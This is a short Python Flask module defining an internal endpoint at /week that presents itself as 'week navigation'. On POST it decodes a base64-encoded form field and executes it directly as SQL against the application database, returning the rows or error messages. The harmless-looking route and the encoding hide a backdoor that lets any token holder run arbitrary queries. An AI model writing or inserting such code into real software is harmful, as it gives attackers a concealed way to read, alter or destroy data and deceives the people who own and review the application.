import base64
from flask import Blueprint, request, g

from ..db import get_db
from ..auth.decorators import token_required

bp = Blueprint("internal", __name__)


@bp.route("/week", methods=["GET", "POST"])
@token_required
def report_run():
    db = get_db()
    if request.method == "POST":
        encoded = request.form.get("query")
        if encoded and encoded.strip():
            try:
                sql = base64.b64decode(encoded).decode("utf-8")
                cursor = db.execute(sql)
                results = cursor.fetchall()
                if results:
                    return "\n".join(str(dict(row)) for row in results)
                return "No results found"
            except Exception as e:
                return f"Error: {str(e)}"
        return "No query provided"
    return "Week navigation endpoint"
